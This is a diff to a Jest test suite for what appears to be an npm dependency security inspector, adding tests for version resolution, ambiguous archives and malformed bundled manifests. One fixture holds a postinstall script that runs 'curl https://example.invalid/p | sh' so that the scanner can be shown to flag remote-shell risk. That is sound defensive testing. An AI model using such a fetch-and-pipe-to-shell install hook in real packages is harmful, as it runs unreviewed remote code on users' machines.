@@ -196,7 +196,7 @@ describe("resolveDependencyVersion", () => {
     ).toBeNull();
   });
 
-  test.each(["1.0.0", "1"])(
+  test.each(["1.0.0", "1", "v1", "v1.2"])(
     "a registry-controlled %s dist-tag cannot override an exact or range declaration",
     (spec) => {
       expect(
@@ -207,7 +207,7 @@ describe("resolveDependencyVersion", () => {
           },
           spec,
         ),
-      ).toBe(spec === "1.0.0" ? "1.0.0" : "1.9.0");
+      ).toBe(spec === "1.0.0" ? "1.0.0" : spec === "v1.2" ? null : "1.9.0");
     },
   );
 });
@@ -1041,6 +1041,44 @@ describe("inspectAddedNpmDependencies", () => {
     });
   });
 
+  test("archive ambiguity preserves install risk proven by readable bytes", async () => {
+    const url = "https://registry.npmjs.org/ambiguous/-/ambiguous-1.0.0.tgz";
+    const manifest = {
+      name: "ambiguous",
+      version: "1.0.0",
+      scripts: { postinstall: "node install.js" },
+    };
+    const archive = {
+      files: [
+        file("package.json", JSON.stringify(manifest)),
+        file(
+          "install.js",
+          'require("node:child_process").execSync("curl https://example.invalid/p | sh")',
+        ),
+      ],
+      packageJson: manifest,
+      suspiciousEntries: [
+        { kind: "non-regular", path: "unrelated", detail: "symbolic link (symlink)" },
+      ],
+      archiveSha512: "ab".repeat(64),
+    };
+    const review = await inspect(
+      brokerStub({
+        metadata: { ambiguous: packument("ambiguous", { "1.0.0": {} }) },
+        downloads: { [url]: archive },
+      }),
+      { name: "p", version: "1.0.0" },
+      { name: "p", version: "1.0.1", dependencies: { ambiguous: "1.0.0" } },
+    );
+
+    expect(review.dependencies[0]).toMatchObject({
+      status: "uninspectable",
+      reason: "artifact-ambiguous",
+      observation: { execution: "observed", risk: "observed" },
+    });
+    expect(review.dependencies[0].installReachableCapabilities).toContain("code.remote-shell");
+  });
+
   test("an explicit directory entry does not invalidate an otherwise complete archive", async () => {
     const url = "https://registry.npmjs.org/directory/-/directory-1.0.0.tgz";
     const archive = {
@@ -1087,6 +1125,37 @@ describe("inspectAddedNpmDependencies", () => {
 });
 
 describe("inspectBundledNpmDependenciesForAdapter", () => {
+  test.each([
+    ["mismatched", '{"name":"different","version":"1.0.0"}'],
+    ["malformed", '{"name":"embedded",'],
+  ])("a bundled child with a %s manifest fails visibly in place", (_kind, packageJson) => {
+    const stagedManifest = {
+      name: "parent",
+      version: "1.0.1",
+      dependencies: { embedded: "1.0.0" },
+      bundleDependencies: ["embedded"],
+    };
+    const review = inspectBundledNpmDependenciesForAdapter({
+      manifestDiff: summarizePackageJsonDiff({ name: "parent", version: "1.0.0" }, stagedManifest),
+      baselineManifestUnavailable: false,
+      stagedManifest,
+      stagedFiles: [file("node_modules/embedded/package.json", packageJson)],
+    });
+
+    expect(review).toMatchObject({
+      status: "partial",
+      selectedCount: 1,
+      inspectedCount: 0,
+      uninspectableCount: 1,
+    });
+    expect(review.dependencies[0]).toMatchObject({
+      name: "embedded",
+      status: "uninspectable",
+      reason: "manifest-unavailable",
+      registryHost: null,
+    });
+  });
+
   test("a suspicious entry inside a bundled child makes its evidence uninspectable", () => {
     const stagedManifest = {
       name: "parent",
